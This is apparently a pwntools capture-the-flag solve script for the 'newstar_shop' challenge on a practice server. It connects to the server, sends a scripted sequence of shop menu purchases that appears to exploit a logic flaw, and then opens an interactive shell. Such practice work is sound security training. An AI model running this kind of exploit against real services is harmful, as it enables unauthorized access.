'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "28446" 
filename = "./newstar_shop"
elf = ELF(filename)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)
    pass

def B():
    gdb.attach(io)
    pause()

def pwn():
    io.sendlineafter(b'=================\n\n', b'1')
    io.sendlineafter(b"What do you want to buy?\n\n", b'2')
    io.sendlineafter(b'=================\n\n', b'1')
    io.sendlineafter(b"What do you want to buy?\n\n", b'2')
    io.sendlineafter(b'=================\n\n', b'3')
    io.sendlineafter(b'=================\n\n', b'1')
    io.sendlineafter(b"What do you want to buy?\n\n", b'3')


if __name__ == "__main__":
    pwn()
    io.interactive()
